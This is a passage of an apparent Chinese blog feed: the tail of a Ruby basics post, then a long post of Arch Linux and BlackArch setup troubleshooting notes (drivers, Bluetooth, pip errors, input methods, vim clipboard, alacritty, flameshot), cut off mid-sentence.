class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Human</span> &lt; <span class="title class_ inherited__">Animal</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> &lt; <span class="title class_ inherited__">Animal</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h1 id="模块-module-模组？"><a href="#模块-module-模组？" class="headerlink" title="模块 module 模组？"></a>模块 module 模组？</h1><p>代码占位符？相当于把代码块导入类中</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定義吐司模組</span></span><br><span class="line"><span class="keyword">module</span> spinning</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">spin</span></span><br><span class="line">    puts <span class="string">&quot;我會吐絲啦!&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 引入模組到人類類別</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Human</span></span><br><span class="line">  <span class="keyword">include</span> spinning <span class="comment"># 引入吐絲模組</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Sean</span> = <span class="title class_">Human</span>.new</span><br><span class="line"><span class="title class_">Sean</span>.spinning <span class="comment"># 我會吐絲啦!</span></span><br></pre></td></tr></table></figure><p>Class 与 Module 的区别：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">3.1.2 :002 &gt;</span> <span class="title class_">Class</span>.instance_methods - <span class="title class_">Module</span>.instance_methods</span><br><span class="line"> =&gt; [<span class="symbol">:allocate</span>, <span class="symbol">:superclass</span>, <span class="symbol">:subclasses</span>, <span class="symbol">:new</span>]</span><br></pre></td></tr></table></figure><p>PS: Ruby 确实蛮灵活的，这都能减！！</p><p>类 Class 比模块 Module 多了以上四个方法，所以 Module：</p><ol><li>无法创建实例</li><li>无法继承其他 Module</li></ol>]]></content:encoded>
      
      
      
      <category domain="https://by-musi.github.io/tags/ruby/">ruby</category>
      
      
      <comments>https://by-musi.github.io/2024/02/28/%E7%AE%80%E5%8D%95%E8%BF%87%E4%B8%80%E4%B8%8BRuby%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>那些年我们踩过的坑--archlinux</title>
      <link>https://by-musi.github.io/2024/02/20/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91--archlinux/</link>
      <guid>https://by-musi.github.io/2024/02/20/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91--archlinux/</guid>
      <pubDate>Mon, 19 Feb 2024 16:00:00 GMT</pubDate>
      
        
        
          
          
      <description></description>
          
        
      
      
      
      <content:encoded><![CDATA[<p>这篇文章是我折腾 archlinux 时遇到的问题汇总。由于本人比较菜，遇到的问题贼拉多，且我老是在折腾的时候忘记时间，常常入迷，很多问题在我解决之后就给忘了，也懒得记了，所以这篇文章只是我遇到的问题的子集，希望能帮助到大家。</p><p>这篇文章的部分内容是我在 2021 年左右第一次折腾 archlinux 的时候记录的，不知道还对不对，哈哈。最近我在学渗透，就想给自己整一个武器库，于是翻出了已经退役三个月的19年买的小新14。对于一个年迈的轻薄本来说，运行 windows 可能太过勉强，所以我又踏上了折腾 arch 的道路….</p><p>21年的内容我会进行标注，还请自行分辨。所有的尝试我都会保留下来，也算是对当时想法的记录，劳烦大家自己寻找想要的答案哈，嘿嘿</p><p><strong>温馨提示：</strong> 请善用 <code>ctrl+f</code> 哦</p><p>标题前的 “已）” 表示已解决</p><p>废话结束，正文开始。</p><p>hacking for fun.</p><hr><h1 id="已）使用-blackarch-安装脚本装完系统后无法启动"><a href="#已）使用-blackarch-安装脚本装完系统后无法启动" class="headerlink" title="已）使用 blackarch 安装脚本装完系统后无法启动"></a>已）使用 blackarch 安装脚本装完系统后无法启动</h1><p>问题详细描述：使用 blackarch 安装脚本 <code>blackarch-install</code> 装完系统，拔出启动盘之后无法启动，甚至无法进入引导。</p><p>解决：八成是在分区的时候把固件和分区表没匹配到一块。一般 UEFI – GPT，DOS – MBR</p><p>这里建议不要直接通过镜像装 blackarch，可以先装个 archlinux 熟悉一下，再引入 blackarch 软件库即可。</p><p>我上来就装了一个<strong>完全版的包含所有工具的 blackarch</strong>，倒腾了半天好不容易进到系统，结果一更新一堆依赖问题，软件既装不上也卸不成。直接重开。</p><h1 id="已）iwd-打不开"><a href="#已）iwd-打不开" class="headerlink" title="已）iwd 打不开"></a>已）iwd 打不开</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl status iwd.service</span><br><span class="line">systemctl start iwd.service </span><br></pre></td></tr></table></figure><p>启动一下 <code>iwd.service</code>。<strong>如果某个服务没 start，那么从理论上讲此服务应该很难打开</strong>emmm</p><h1 id="已）找不到网卡"><a href="#已）找不到网卡" class="headerlink" title="已）找不到网卡"></a>已）找不到网卡</h1><p>一般使用 <code>ip link [interface] up|down</code> 来启动&#x2F;禁用网络接口&#x2F;网卡 ([interface] 表示你的网卡名字，如 eth0，wlan0) 。</p><p>但如果你 <code>ip link</code> 没显示网卡，那应该是没装相关驱动。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S linux-firmware</span><br></pre></td></tr></table></figure><p>我遇到的情况是本来网卡好好的，突然给掉了，装了驱动之后也没事了。难道我之前忘记装驱动了，那它之前是咋跑的？emmm</p><h1 id="无法连接-BUPT-mobile"><a href="#无法连接-BUPT-mobile" class="headerlink" title="无法连接 BUPT-mobile"></a>无法连接 BUPT-mobile</h1><h1 id="已）xfce-gnome-屏闪、卡顿"><a href="#已）xfce-gnome-屏闪、卡顿" class="headerlink" title="已）xfce&#x2F;gnome 屏闪、卡顿"></a>已）xfce&#x2F;gnome 屏闪、卡顿</h1><p>我先装的 xfce，但是进入图形环境之后老时不时闪一下，其每次进入 xfce 时老是乌漆嘛黑一片，需要等个二十来秒，有时后还不显示菜单栏。之后换了 gnome 还是这个问题。</p><p>解决：八成是 intel, AMD, NVIDIA 驱动没装，或者没装对版本。具体自己上网搜一下吧。</p><h1 id="已）gnome-无法使用蓝牙"><a href="#已）gnome-无法使用蓝牙" class="headerlink" title="已）gnome 无法使用蓝牙"></a>已）gnome 无法使用蓝牙</h1><p>问题描述，蓝牙这个开关按不按没反应，估计八成又是那个驱动没装？</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240106103706.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240106103706.png"></a></p><p>md，安装 archlinux 的时候忘记装蓝牙模块了，emm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S bluez bluez-utils</span><br><span class="line">systemctl start bluetooth.service</span><br></pre></td></tr></table></figure><h1 id="连接蓝牙耳机后，声音一卡一卡的"><a href="#连接蓝牙耳机后，声音一卡一卡的" class="headerlink" title="连接蓝牙耳机后，声音一卡一卡的"></a>连接蓝牙耳机后，声音一卡一卡的</h1><h1 id="已）使用-blackarch-库一直提示密钥不正确"><a href="#已）使用-blackarch-库一直提示密钥不正确" class="headerlink" title="已）使用 blackarch 库一直提示密钥不正确"></a>已）使用 blackarch 库一直提示密钥不正确</h1><p>我在第一次用 blackarch 库的时候挂了代理，导致密钥一直配不上。后面把代理关了就没事了。</p><p>官方给出的解决方案是：<a href="https://blackarch.org/faq.html#collapseFour">Why do I get invalid keyring signature?</a></p><h1 id="已）archlinux-使用-pip-报错：error-externally-managed-environment"><a href="#已）archlinux-使用-pip-报错：error-externally-managed-environment" class="headerlink" title="已）archlinux 使用 pip 报错：error: externally-managed-environment"></a>已）archlinux 使用 pip 报错：error: externally-managed-environment</h1><p>运行 dirsearch 时报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ dirsearch</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/usr/share/dirsearch/dirsearch.py&quot;, line 23, in &lt;module&gt;</span><br><span class="line">    from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line">ModuleNotFoundError: No module named &#x27;pkg_resources&#x27;</span><br></pre></td></tr></table></figure><p>依赖问题，我使用 pip 安装了一下 <code>requirements.txt</code> 里面的包，但是报错了，报错信息如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">➜  dirsearch pip install -r requirements.txt</span><br><span class="line">error: externally-managed-environment</span><br><span class="line"></span><br><span class="line">× This environment is externally managed</span><br><span class="line">╰─&gt; To install Python packages system-wide, try &#x27;pacman -S</span><br><span class="line">    python-xyz&#x27;, where xyz is the package you are trying to</span><br><span class="line">    install.</span><br><span class="line"></span><br><span class="line">    If you wish to install a non-Arch-packaged Python package,</span><br><span class="line">    create a virtual environment using &#x27;python -m venv path/to/venv&#x27;.</span><br><span class="line">    Then use path/to/venv/bin/python and path/to/venv/bin/pip.</span><br><span class="line"></span><br><span class="line">    If you wish to install a non-Arch packaged Python application,</span><br><span class="line">    it may be easiest to use &#x27;pipx install xyz&#x27;, which will manage a</span><br><span class="line">    virtual environment for you. Make sure you have python-pipx</span><br><span class="line">    installed via pacman.</span><br><span class="line"></span><br><span class="line">note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.</span><br><span class="line">hint: See PEP 668 for the detailed specification.</span><br></pre></td></tr></table></figure><p>大概意思就是说在 archlinux 下还是尽量使用 pacman 包管理工具，为了防止包管理过于混乱，下载 python 包使用命令：<code>sudo pacman -S python-[package name]</code>，这里特指 Python3 的包，具体参看官网说明说明：<a href="https://wiki.archlinux.org/title/Python_package_guidelines">Python package guidelines</a></p><p>下载特定版本的包：<code>sudo pacman -S python-[package name]=[version]</code></p><p>#todo</p><ul><li><input disabled="" type="checkbox"> 当然，也能使用虚拟环境，这个还没学</li></ul><p>回到运行 dirsearch 的那个问题，<strong>“ModuleNotFoundError: No module named ‘pkg_resources’”</strong>，简单 google 一下，发现是 python setuptools 包的问题，链接：<a href="https://stackoverflow.com/questions/7446187/no-module-named-pkg-resources">No module named pkg_resources</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S python-setuptools</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ dirsearch --version</span><br><span class="line">/usr/share/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line">dirsearch v0.4.3</span><br></pre></td></tr></table></figure><p>咋又有新问题了，裂开。</p><h1 id="rofi-show-run-无法输入"><a href="#rofi-show-run-无法输入" class="headerlink" title="rofi -show run 无法输入"></a>rofi -show run 无法输入</h1><h1 id="已）钉钉无法输入中文"><a href="#已）钉钉无法输入中文" class="headerlink" title="已）钉钉无法输入中文"></a>已）钉钉无法输入中文</h1><p>需要先在别的输入框中激活输入法，我的快捷键是 <code>ctrl+space</code>，激活了之后就可以在聊天框里输入中文了。</p><p>方法略蠢，但好使。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112112541.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112112541.png"></a></p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2024.01.22 更新 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><p>用着用着就好了，我也不知道为啥。</p><h1 id="已）zsh-终端和-vim-下都不能输入中文-bash-可以"><a href="#已）zsh-终端和-vim-下都不能输入中文-bash-可以" class="headerlink" title="已）zsh 终端和 vim 下都不能输入中文, bash 可以"></a>已）zsh 终端和 vim 下都不能输入中文, bash 可以</h1><p>这次折腾，我直接装了 facix5，没遇到这个问题，虽然忘记了曾经遇到的问题和解决办法，但冥冥之中我选择了正确的路，这难道就是折腾的意义？爱了。</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2021 start &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><p>经过进一步折腾发现，无法输入中文并不是因为 zsh 和 bash，而是终端模拟器的问题，在 gnome-terminal 下的 bash 和 zsh 里面均可以使用中文输入法，而在 alacritty( 我经常用的一个终端 ) 下就不行。</p><h2 id="alacritty-下无法输入中文"><a href="#alacritty-下无法输入中文" class="headerlink" title="&#x3D;&#x3D;&gt;   alacritty 下无法输入中文"></a>&#x3D;&#x3D;&gt;   alacritty 下无法输入中文</h2><p>查了半天发现，好像是环境变量的问题（虽然我之前也怀疑是这个问题，但是不敢相信T_T），解决环境问题感觉有点麻烦，明明配的都一样为啥就是不行呢，直接人没了</p><p>所以解决这个问题的一种办法是将两种终端下的环境变量进行对照，看看那些环境变量在 alacritty 下没有而在 gnome-terminal 下有，然后加上就行。</p><p>稍微对照了一下两者的环境变量，发现差别还是蛮大的，反正直接人看傻了。</p><p>然后果断放弃，卸掉 fcitx，不会卸载的朋友不要慌，我在下面提供了一条命令，包教包会。当然，是在 archlinux 下的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -Rsc fcitx</span><br></pre></td></tr></table></figure><p>直接用最狠的卸载方法，把 <code>-c</code> 都给他安排上。</p><p>就这？就这？我 timi 卸了 fcitx 咋用输入法呀，这条命令还把和 fcitx 有关的包卸载的一干二净，我 timi 直接 我 timi…..</p><p>不要慌，这不还没完呢吗，放弃 fcitx 拥抱 fcitx5，下个 fcitx5 就没事了。</p><p>（完）</p><p>：好家伙，早给我说最后一句话不就完了吗。。。</p><p>当然，如果能从环境变量解决这个问题更好，以后有时间再说吧，我现在太菜了，直接搞环境变量有点劝退。</p><p><strong>就吃了个饭，他又不行了</strong></p><p>还是老问题，在除了 alacritty 的其他地方都可以使用中文输入法，说明 fcitx5 是开启着的。</p><p>贴一个运行 <code>fcitx5</code> 的返回结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">I2021-06-04 19:18:00.426472 instance.cpp:1371] Override Enabled Addons: &#123;&#125;</span><br><span class="line">I2021-06-04 19:18:00.426521 instance.cpp:1372] Override Disabled Addons: &#123;&#125;</span><br><span class="line">I2021-06-04 19:18:00.428514 addonmanager.cpp:189] Loaded addon wayland</span><br><span class="line">I2021-06-04 19:18:00.431752 addonmanager.cpp:189] Loaded addon xcb</span><br><span class="line">I2021-06-04 19:18:00.433775 addonmanager.cpp:189] Loaded addon quickphrase</span><br><span class="line">I2021-06-04 19:18:00.434194 addonmanager.cpp:189] Loaded addon clipboard</span><br><span class="line">I2021-06-04 19:18:00.434375 addonmanager.cpp:189] Loaded addon imselector</span><br><span class="line">I2021-06-04 19:18:00.441746 addonmanager.cpp:189] Loaded addon keyboard</span><br><span class="line">I2021-06-04 19:18:00.442009 addonmanager.cpp:189] Loaded addon waylandim</span><br><span class="line">I2021-06-04 19:18:00.442199 addonmanager.cpp:189] Loaded addon unicode</span><br><span class="line">I2021-06-04 19:18:00.442928 addonmanager.cpp:189] Loaded addon pinyinhelper</span><br><span class="line">E2021-06-04 19:18:00.443962 addonloader.cpp:57] Failed to create addon: dbus Unable to request dbus name. Is there another fcitx already running?</span><br><span class="line">I2021-06-04 19:18:00.444088 addonmanager.cpp:295] Unloading addon pinyinhelper</span><br><span class="line">I2021-06-04 19:18:00.444131 addonmanager.cpp:295] Unloading addon unicode</span><br><span class="line">I2021-06-04 19:18:00.444169 addonmanager.cpp:295] Unloading addon waylandim</span><br><span class="line">I2021-06-04 19:18:00.444214 addonmanager.cpp:295] Unloading addon keyboard</span><br><span class="line">I2021-06-04 19:18:00.444397 addonmanager.cpp:295] Unloading addon imselector</span><br><span class="line">I2021-06-04 19:18:00.444417 addonmanager.cpp:295] Unloading addon clipboard</span><br><span class="line">I2021-06-04 19:18:00.444449 addonmanager.cpp:295] Unloading addon quickphrase</span><br><span class="line">I2021-06-04 19:18:00.444684 addonmanager.cpp:295] Unloading addon xcb</span><br><span class="line">I2021-06-04 19:18:00.444852 addonmanager.cpp:295] Unloading addon wayland</span><br></pre></td></tr></table></figure><p>注销重进一下就解决了，我人傻了。还是没搞清楚来龙去脉，只是现在暂时能用。这怕就是码农的生存之道吗。</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2021 end &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><h1 id="已）vim-无法和系统剪切板交互"><a href="#已）vim-无法和系统剪切板交互" class="headerlink" title="已）vim 无法和系统剪切板交互"></a>已）vim 无法和系统剪切板交互</h1><p>这次直接装了 neovim。其实应该可以 <code>ctrl+shift+c</code> 和 <code>ctrl+shift+v</code> 直接复制粘贴吧，这两个是在终端下复制粘贴的快捷键。</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2024.01.08 更新 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><p>直接 <code>ctrl+shift+c</code> 好像不太行，可以看这篇 <a href="https://stackoverflow.com/questions/67598285/cannot-paste-from-clipboard-in-neovim-nightly">stackoverflow</a></p><p>在 neovim 中使用命令：<code>:checkhealth provider</code>，在没有配置剪切板工具的时候显示如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">## Clipboard (optional)</span><br><span class="line">  - WARNING: No clipboard tool found. Clipboard registers (`&quot;+` and `&quot;*`) will not work.</span><br><span class="line">    - ADVICE:</span><br><span class="line">      - :help clipboard</span><br></pre></td></tr></table></figure><p>安装 <code>xclip</code>，<code>sudo pacman -S xclip</code>，再次 <code>:checkhealth provider</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Clipboard (optional) ~</span><br><span class="line">- OK Clipboard tool found: xclip</span><br></pre></td></tr></table></figure><p>选中内容，右键即可复制，可以配置快捷键，如下图所示。不过现在我用 nvim 用的还不太多，就先到此为止了。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240108110552.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240108110552.png"></a></p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2021 start &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><p>简单来讲就是vim中复制的东西只能在vim中粘贴（y键 &amp; p键），不能在vim之外的其他地方粘贴，没法共享系统剪切板 （clipboard）。</p><p>这个问题困扰了我很久，最后发现是 clipboard 的问题，通过下面这条命令可以查看你的vim是否支持 clipboard，如果不支持的话，咋配置都没用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim --version | grep clipboard</span><br></pre></td></tr></table></figure><p>如果你的 clipboard 前面显示的是 <code>-</code> 的话，说明你的 vim 不支持 clipboard。这个时候就考虑换个 vim 吧，我直接装了 gvim</p><p>在 archlinux 下安装 gvim</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S gvim</span><br></pre></td></tr></table></figure><p>然后，然后？就没然后了，问题解决。</p><p>至于为什么，等学到 vim 寄存器再说吧。</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2021 end &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><p>md，两年了，vim 寄存器还没学</p><h1 id="已）在终端下-source-vimrc-报错"><a href="#已）在终端下-source-vimrc-报错" class="headerlink" title="已）在终端下 source ~&#x2F;.vimrc 报错"></a>已）在终端下 source ~&#x2F;.vimrc 报错</h1><p>一个脑残问题emmm，想起两年前在这个问题上，浪费了那么长时间，我这心里就嘎嘎难受。这个问题已经印在我脑子里了，不过最近回看又知道了 <code>:source $MYVIMRC</code>，学了+忘了&#x3D;没学..</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2021 start &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><p>今天我兴冲冲地配置了老半天我的 vim， 配置完又兴冲冲地在 <code>zsh</code> 终端下输入<code>source ~/.vimrc</code>，我都想好运行完的结果：一切都朝着预想滴方向进行，然后兴冲冲地在 <code>vim</code> 下快乐地 <code>coding</code>。</p><p>于是，我轻轻地按下了 <code>enter</code> 键，直接给我报了几个错，瞬间人呆了，傻了，疯了，没了，这咋还报错了呢，啊啊啊啊！！！</p><p>ps: 我 21 年这么憨的吗 emmm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.vimrc:1: 权限不够:</span><br><span class="line">.vimrc:2: command not found:  ==&gt; General\n\n</span><br><span class="line">.vimrc:7: command not found:  Sets line number\nset nu</span><br><span class="line">.vimrc:18: 没有那个文件或目录: leader</span><br><span class="line">.vimrc:20: bad math expression: operand expected at &#x27;,&#x27;</span><br><span class="line">.vimrc:22: command not found:  Move quickly\nnnoremap J 6j\nnnoremap K 5k\n\nset smarttab</span><br><span class="line">.vimrc:27: = not found</span><br></pre></td></tr></table></figure><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p><code>source ~/.vimrc</code> 相当于是把 <code>~/.vimrc</code>，中的每一条命令都在终端 <code>zsh</code> 或者 <code>bash</code> 下执行一遍，所以当然不符合 vimscript 的语法（<code>source .zshrc</code> 玩多了，脑子有点不好使。。。）。</p><p>正确方法应该是在 vim 中使用 <code>:source $MYVIMRC</code> 刷新配置文件，或者退出来重进一下就行了。</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2021 end &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><h1 id="已）配置-alacritty，有时候按退格键却变成空格的问题"><a href="#已）配置-alacritty，有时候按退格键却变成空格的问题" class="headerlink" title="已）配置 alacritty，有时候按退格键却变成空格的问题"></a>已）配置 alacritty，有时候按退格键却变成空格的问题</h1><p>暂时还没有使用 ssh，还没遇到这个问题。</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2021 start &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><p>这个问题是我在 alaritty 终端使用 ssh 连接到我的服务器上出现的，连接到服务器的终端之后就出现了这个问题，而在 gnome-terminal 下连接就好好的。</p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>这个方法是在 github 上这个 alacritty 项目的 issue 下给的。</p><p>将 alacritty.yml 配置文件中的实体（entry）<code>env</code> 下的环境变量 <code>$TERM</code> 设置成 <code>xterm-256color</code>。</p><p>至于原因嘛，还没搞明白</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2021 end &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><h1 id="已）alacritty-需要使用-TOML-配置"><a href="#已）alacritty-需要使用-TOML-配置" class="headerlink" title="已）alacritty 需要使用 TOML 配置"></a>已）alacritty 需要使用 TOML 配置</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240106103909.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240106103909.png"></a></p><p>alacritty 在 0.13 版本之后使用 <code>.toml</code> 配置文件格式，有关 TOML 的内容可以戳 –&gt; <a href="https://toml.io/cn/v1.0.0">这里</a>。</p><p>直接 <code>alaritty migrate</code> 就可以把原来的配置文件 <code>alacritty.yml</code> 转换成 <code>alacritty.toml</code>。当然，前提是 <code>yml</code> 配置的没问题，不像某菜鸡，配置文件写了个错错都没发现（我就说咋改不改配置 alacritty 都没反应呢）。一直到 <code>alaritty migrate</code> 才发现原来的配资都是错的 emmm</p><p>更详细的配置说明参看 <a href="https://alacritty.org/config-alacritty.html">官方配置文档</a>。</p><h2 id="alacritty-配滚动条"><a href="#alacritty-配滚动条" class="headerlink" title="alacritty 配滚动条"></a>alacritty 配滚动条</h2><h1 id="已）flameshot-截屏软件在gnome下无法使用"><a href="#已）flameshot-截屏软件在gnome下无法使用" class="headerlink" title="已）flameshot 截屏软件在gnome下无法使用"></a>已）flameshot 截屏软件在gnome下无法使用</h1><p>问题描述 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">caishao@archlinux  ~  flameshot gui</span><br><span class="line">Warning: Ignoring XDG_SESSION_TYPE=wayland on Gnome. Use QT_QPA_PLATFORM=wayland to run on Wayland anyway.</span><br><span class="line">flameshot: error: Unable to capture screen</span><br><span class="line">flameshot: error: Unable to capture screen</span><br><span class="line">flameshot: info: Screenshot aborted.</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240106104216.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240106104216.png"></a></p><p>解决方法：</p><p>使用 gnome-terminal 终端运行可以使用 <code>flameshot gui</code>。</p><p>配置快捷键所使用的终端命令，我配置的是 <code>Alt+a</code>，跟微信截图一样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gnome-terminal -- flameshot gui</span><br><span class="line">gnome-terminal -- bash -c &quot;flameshot gui&quot;</span><br></pre></td></tr></table></figure><p>但在截屏的时候会先出现一个 <strong>gnome-terminal 窗口</strong>，之后才会运行 <code>flameshot gui</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnome-terminal -- bash -c &quot;sleep 2; flameshot gui&quot;</span><br></pre></td></tr></table></figure><p>可以先让终端睡 2 秒，我们好调整一下窗口的位置。emmm 要被这法子蠢哭了。</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2024.01.08 更新 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><p>发现了一个比较可行的解决方法（对我来说）：因为我平常是 笔记本+外接显示器，截图的时候把鼠标移到想要截图的另一块屏幕上，就不会被弹出的 gnome 终端窗口影响啦。</p><p>（方法有点蠢）</p><p>不过有一说一，flameshot 功能确实强大，简单好用。</p><h1 id="已）archlinux-安装-deb-文件"><a href="#已）archlinux-安装-deb-文件" class="headerlink" title="已）archlinux 安装 deb 文件"></a>已）archlinux 安装 deb 文件</h1><p>安装 <a href="https://gitlab.com/shodan-public/nrich">nrich</a> 时，发现只有 deb 文件。</p><p>使用 <a href="https://github.com/helixarch/debtap">debtap</a> 转换 deb 包，然后使用 pacman 